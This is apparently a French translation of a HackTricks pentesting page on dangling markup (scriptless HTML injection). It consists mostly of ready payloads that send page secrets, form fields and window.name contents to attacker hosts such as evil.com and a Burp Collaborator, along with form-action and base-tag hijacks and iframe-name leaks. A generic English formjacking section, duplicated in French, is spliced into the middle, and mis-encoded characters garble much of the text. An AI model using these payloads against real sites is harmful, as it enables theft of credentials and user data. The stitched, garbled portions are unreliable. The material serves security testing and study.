# Dangling Markup - Injection HTML sans script

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? Ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## RÃ©sumÃ©

Cette technique peut Ãªtre utilisÃ©e pour extraire des informations d'un utilisateur lorsqu'une **injection HTML est trouvÃ©e**. Cela est trÃ¨s utile si vous **ne trouvez aucun moyen d'exploiter un** [**XSS**](../xss-cross-site-scripting/) mais que vous pouvez **injecter certaines balises HTML**.\
C'est Ã©galement utile si un **secret est enregistrÃ© en clair** dans le HTML et que vous souhaitez l'**exfiltrer** du client, ou si vous souhaitez tromper l'exÃ©cution d'un script.

Plusieurs techniques commentÃ©es ici peuvent Ãªtre utilisÃ©es pour contourner certaines [**politiques de sÃ©curitÃ© du contenu**](../content-security-policy-csp-bypass/) en exfiltrant des informations de maniÃ¨re inattendue (balises HTML, CSS, balises http-meta, formulaires, base...).

## Principales applications

### Vol de secrets en texte clair

Si vous injectez `<img src='http://evil.com/log.cgi?` lorsque la page est chargÃ©e, la victime vous enverra tout le code entre la balise `img` injectÃ©e et la prochaine guillemet Ã  l'intÃ©rieur du code. Si un secret est situÃ© dans ce morceau, vous le volerez (vous pouvez faire la mÃªme chose en utilisant une guillemet double, regardez ce qui pourrait Ãªtre plus intÃ©ressant Ã  utiliser).

Si la balise `img` est interdite (en raison de la CSP par exemple), vous pouvez Ã©galement utiliser `<meta http-equiv="refresh" content="4; URL='http://evil.com/log.cgi?`.
```
<img src='http://attacker.com/log.php?HTML=
<meta http-equiv="refresh" content='0; url=http://evil.com/log.php?text=
<meta http-equiv="refresh" content='0;URL=ftp://evil.com?a=
```
Notez que **Chrome bloque les URL HTTP** contenant "<" ou "\n", vous pouvez donc essayer d'autres schÃ©mas de protocole comme "ftp".

Vous pouvez Ã©galement abuser de CSS `@import` (cela enverra tout le code jusqu'Ã  ce qu'il trouve un ";").
```markup
<style>@import//hackvertor.co.uk?     <--- Injected
<b>steal me!</b>;
```
Vous pouvez Ã©galement utiliser **`<table`** :
```bash
<table background='//your-collaborator-id.burpcollaborator.net?'
```
Vous pouvez Ã©galement insÃ©rer une balise `<base`. Toutes les informations seront envoyÃ©es jusqu'Ã  ce que la citation soit fermÃ©e, mais cela nÃ©cessite une interaction de l'utilisateur (l'utilisateur doit cliquer sur un lien, car la balise base aura modifiÃ© le domaine pointÃ© par le lien) :
```markup
<base target='        <--- Injected
steal me'<b>test</b>
```
### Vol de formulaires

---

#### Description

In some cases, web applications may have forms that are not properly secured, allowing an attacker to steal sensitive information entered by users. This technique is known as form stealing or formjacking.

#### Vulnerability

The vulnerability occurs when a web application fails to implement proper security measures to protect user input. This can happen due to various reasons, such as improper validation, lack of input sanitization, or insecure storage of user data.

#### Exploitation

To exploit this vulnerability, an attacker can inject malicious code into the web application, typically through scriptless injection techniques. This code is designed to capture user input, such as login credentials, credit card information, or personal details, and send it to a remote server controlled by the attacker.

#### Mitigation

To mitigate the risk of form stealing attacks, web developers should implement proper security measures, including:

- Input validation and sanitization to prevent malicious code injection.
- Secure storage of user data, such as using encryption or hashing algorithms.
- Regular security audits and vulnerability assessments to identify and fix any potential vulnerabilities.
- Keeping software and plugins up to date to ensure the latest security patches are applied.

---

#### Description

Dans certains cas, les applications web peuvent avoir des formulaires qui ne sont pas correctement sÃ©curisÃ©s, ce qui permet Ã  un attaquant de voler des informations sensibles saisies par les utilisateurs. Cette technique est connue sous le nom de vol de formulaires ou de formjacking.

#### VulnÃ©rabilitÃ©

La vulnÃ©rabilitÃ© se produit lorsque une application web ne met pas en place les mesures de sÃ©curitÃ© appropriÃ©es pour protÃ©ger les entrÃ©es des utilisateurs. Cela peut se produire pour diverses raisons, telles qu'une validation incorrecte, un manque de sanitisation des entrÃ©es ou un stockage non sÃ©curisÃ© des donnÃ©es utilisateur.

#### Exploitation

Pour exploiter cette vulnÃ©rabilitÃ©, un attaquant peut injecter du code malveillant dans l'application web, gÃ©nÃ©ralement par le biais de techniques d'injection sans script. Ce code est conÃ§u pour capturer les saisies des utilisateurs, telles que les identifiants de connexion, les informations de carte de crÃ©dit ou les coordonnÃ©es personnelles, et les envoyer Ã  un serveur distant contrÃ´lÃ© par l'attaquant.

#### AttÃ©nuation

Pour attÃ©nuer le risque d'attaques de vol de formulaires, les dÃ©veloppeurs web doivent mettre en place des mesures de sÃ©curitÃ© appropriÃ©es, notamment :

- La validation et la sanitisation des entrÃ©es pour prÃ©venir l'injection de code malveillant.
- Le stockage sÃ©curisÃ© des donnÃ©es utilisateur, par exemple en utilisant le chiffrement ou des algorithmes de hachage.
- Des audits de sÃ©curitÃ© rÃ©guliers et des Ã©valuations des vulnÃ©rabilitÃ©s pour identifier et corriger les Ã©ventuelles failles.
- Maintenir Ã  jour les logiciels et les plugins pour garantir l'application des derniers correctifs de sÃ©curitÃ©.
```markup
<base href='http://evil.com/'>
```
Ensuite, les formulaires qui envoient des donnÃ©es vers un chemin (comme `<form action='update_profile.php'>`) enverront les donnÃ©es vers le domaine malveillant.

### Vol de formulaires 2

DÃ©finissez un en-tÃªte de formulaire : `<form action='http://evil.com/log_steal'>` cela Ã©crasera l'en-tÃªte du formulaire suivant et toutes les donnÃ©es du formulaire seront envoyÃ©es Ã  l'attaquant.

### Vol de formulaires 3

Le bouton peut modifier l'URL vers laquelle les informations du formulaire vont Ãªtre envoyÃ©es avec l'attribut "formaction":
```markup
<button name=xss type=submit formaction='https://google.com'>I get consumed!
```
Un attaquant peut utiliser cela pour voler les informations.

### Vol de secrets en texte clair 2

En utilisant la derniÃ¨re technique mentionnÃ©e pour voler des formulaires (en injectant un nouvel en-tÃªte de formulaire), vous pouvez ensuite injecter un nouveau champ de saisie :
```markup
<input type='hidden' name='review_body' value="
```
et ce champ de saisie contiendra tout le contenu entre ses guillemets et les guillemets suivants dans le HTML. Cette attaque mÃ©lange "_**Vol de secrets en texte clair**_" avec "_**Vol de formulaires2**_".

Vous pouvez faire la mÃªme chose en injectant un formulaire et une balise `<option>`. Toutes les donnÃ©es jusqu'Ã  ce qu'une balise `</option>` fermÃ©e soit trouvÃ©e seront envoyÃ©es :
```markup
<form action=http://google.com><input type="submit">Click Me</input><select name=xss><option
```
### Injection de paramÃ¨tre de formulaire

Vous pouvez modifier le chemin d'un formulaire et insÃ©rer de nouvelles valeurs afin qu'une action inattendue soit effectuÃ©e :
```markup
<form action='/change_settings.php'>
<input type='hidden' name='invite_user'
value='fredmbogo'>                                        â† Injected lines

<form action="/change_settings.php">                        â† Existing form (ignored by the parser)
...
<input type="text" name="invite_user" value="">             â† Subverted field
...
<input type="hidden" name="xsrf_token" value="12345">
...
</form>
```
### Vol de secrets en texte clair via noscript

`<noscript></noscript>` est une balise dont le contenu sera interprÃ©tÃ© si le navigateur ne prend pas en charge JavaScript (vous pouvez activer/dÃ©sactiver JavaScript dans Chrome Ã  l'adresse [chrome://settings/content/javascript](chrome://settings/content/javascript)).

Une faÃ§on d'exfiltrer le contenu de la page web depuis le point d'injection jusqu'en bas vers un site contrÃ´lÃ© par l'attaquant sera d'injecter ceci :
```markup
<noscript><form action=http://evil.com><input type=submit style="position:absolute;left:0;top:0;width:100%;height:100%;" type=submit value=""><textarea name=contents></noscript>
```
### Contournement de CSP avec interaction utilisateur

Ã€ partir de cette [recherche de PortSwigger](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup), vous pouvez apprendre que mÃªme dans les environnements les plus restreints par CSP, vous pouvez toujours **exfiltrer des donnÃ©es** avec une certaine **interaction utilisateur**. Cette fois-ci, nous allons utiliser la charge utile :
```markup
<a href=http://attacker.net/payload.html><font size=100 color=red>You must click me</font></a>
<base target='
```
Notez que vous demanderez Ã  la **victime** de **cliquer sur un lien** qui le **redirigera** vers une **charge utile** contrÃ´lÃ©e par vous. Notez Ã©galement que l'attribut **`target`** Ã  l'intÃ©rieur de la balise **`base`** contiendra du **contenu HTML** jusqu'Ã  la prochaine apostrophe.\
Cela fera en sorte que la **valeur** de **`window.name`** lorsque le lien est cliquÃ© sera tout ce **contenu HTML**. Par consÃ©quent, comme vous **contrÃ´lez la page** Ã  laquelle la victime accÃ¨de en cliquant sur le lien, vous pouvez accÃ©der Ã  cette **`window.name`** et **exfiltrer** ces donnÃ©es :
```markup
<script>
if(window.name) {
new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
</script>
```
### Flux de travail trompeur 1 - Attaque de l'espace de noms HTML

InsÃ©rez une nouvelle balise avec un identifiant Ã  l'intÃ©rieur de l'HTML qui Ã©crasera la suivante et avec une valeur qui affectera le flux d'un script. Dans cet exemple, vous sÃ©lectionnez avec qui une information va Ãªtre partagÃ©e:
```markup
<input type='hidden' id='share_with' value='fredmbogo'>     â† Injected markup
...
Share this status update with:                              â† Legitimate optional element of a dialog
<input id='share_with' value=''>

...

function submit_status_update() {
...
request.share_with = document.getElementById('share_with').value;
...
}
```
### Flux de travail trompeur du script 2 - Attaque de l'espace de noms du script

CrÃ©ez des variables Ã  l'intÃ©rieur de l'espace de noms du javascript en insÃ©rant des balises HTML. Ensuite, cette variable affectera le flux de l'application:
```markup
<img id='is_public'>                                        â† Injected markup

...

// Legitimate application code follows

function retrieve_acls() {
...
if (response.access_mode == AM_PUBLIC)                    â† The subsequent assignment fails in IE
is_public = true;
else
is_public = false;
}

function submit_new_acls() {
...
if (is_public) request.access_mode = AM_PUBLIC;           â† Condition always evaluates to true
...
}
```
### Abus de JSONP

Si vous trouvez une interface JSONP, vous pourriez Ãªtre en mesure d'appeler une fonction arbitraire avec des donnÃ©es arbitraires :
```markup
<script src='/editor/sharing.js'>:              â† Legitimate script
function set_sharing(public) {
if (public) request.access_mode = AM_PUBLIC;
else request.access_mode = AM_PRIVATE;
...
}

<script src='/search?q=a&call=set_sharing'>:    â† Injected JSONP call
set_sharing({ ... })
```
Ou vous pouvez mÃªme essayer d'exÃ©cuter du javascript:
```markup
<script src='/search?q=a&call=alert(1)'></script>
```
### Abus de l'Ã©lÃ©ment iframe

Notez qu'un **document enfant peut afficher et dÃ©finir la propriÃ©tÃ© de localisation du parent, mÃªme s'il est en provenance d'un autre domaine.** Cela signifie que vous pouvez faire en sorte que le client accÃ¨de Ã  n'importe quelle autre page en chargeant Ã  l'intÃ©rieur d'un **iframe** du code tel que :
```markup
<html><head></head><body><script>top.window.location = "https://attacker.com/hacked.html"</script></body></html>
```
Cela peut Ãªtre attÃ©nuÃ© avec quelque chose comme : _**sandbox=â€™ allow-scripts allow-top-navigationâ€™**_

Un iframe peut Ã©galement Ãªtre utilisÃ© pour divulguer des informations sensibles Ã  partir d'une autre page **en utilisant l'attribut name de l'iframe**. Cela est possible car vous pouvez crÃ©er un iframe qui s'iframe lui-mÃªme en abusant de l'injection HTML qui fait apparaÃ®tre les **informations sensibles Ã  l'intÃ©rieur de l'attribut name de l'iframe** et ensuite y accÃ©der depuis l'iframe initial et les divulguer.
```html
<script>
function cspBypass(win) {
win[0].location = 'about:blank';
setTimeout(()=>alert(win[0].name), 500);
}
</script>

<iframe src="//subdomain1.portswigger-labs.net/bypassing-csp-with-dangling-iframes/target.php?email=%22><iframe name=%27" onload="cspBypass(this.contentWindow)"></iframe>
```
Pour plus d'informations, consultez [https://portswigger.net/research/bypassing-csp-with-dangling-iframes](https://portswigger.net/research/bypassing-csp-with-dangling-iframes)

### \<meta abus

Vous pouvez utiliser **`meta http-equiv`** pour effectuer **plusieurs actions** telles que dÃ©finir un cookie : `<meta http-equiv="Set-Cookie" Content="SESSID=1">` ou effectuer une redirection (dans 5s dans ce cas) : `<meta name="language" content="5;http://attacker.svg" HTTP-EQUIV="refresh" />`

Cela peut Ãªtre **Ã©vitÃ©** avec une **CSP** concernant **http-equiv** (`Content-Security-Policy: default-src 'self';`, ou `Content-Security-Policy: http-equiv 'self';`)

### Nouvelle balise HTML \<portal

Vous pouvez trouver une recherche trÃ¨s **intÃ©ressante** sur les vulnÃ©rabilitÃ©s exploitables de la balise \<portal [ici](https://research.securitum.com/security-analysis-of-portal-element/).\
Au moment de la rÃ©daction de cet article, vous devez activer la balise portal sur Chrome dans `chrome://flags/#enable-portals` sinon cela ne fonctionnera pas.
```markup
<portal src='https://attacker-server?
```
### Fuites HTML

Toutes les faÃ§ons de divulguer la connectivitÃ© en HTML ne seront pas utiles pour le Dangling Markup, mais parfois cela pourrait aider. Consultez-les ici: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## Fuites SS

Il s'agit d'un **mÃ©lange** entre **dangling markup et XS-Leaks**. D'un cÃ´tÃ©, la vulnÃ©rabilitÃ© permet d'**injecter du HTML** (mais pas de JS) dans une page de la **mÃªme origine** que celle que nous attaquerons. D'un autre cÃ´tÃ©, nous n'**attaquerons** pas directement la page oÃ¹ nous pouvons injecter du HTML, mais **une autre page**.

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Search/XS-Leaks

XS-Search est orientÃ© vers l'**exfiltration d'informations entre origines** en exploitant des **attaques de canal secondaire**. Par consÃ©quent, il s'agit d'une technique diffÃ©rente du Dangling Markup, cependant, certaines des techniques abusent de l'inclusion de balises HTML (avec et sans exÃ©cution de JS), comme l'**injection CSS** ou le **chargement paresseux des images**.

{% content-ref url="../xs-search.md" %}
[xs-search.md](../xs-search.md)
{% endcontent-ref %}

## Liste de dÃ©tection de force brute

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## RÃ©fÃ©rences

Toutes les techniques prÃ©sentÃ©es ici et plus encore peuvent Ãªtre consultÃ©es en dÃ©tail sur:

{% embed url="http://lcamtuf.coredump.cx/postxss/" %}

D'autres balises HTML qui peuvent Ãªtre abusÃ©es peuvent Ãªtre trouvÃ©es ici:

{% embed url="http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/" %}

Plus d'informations:

{% embed url="https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
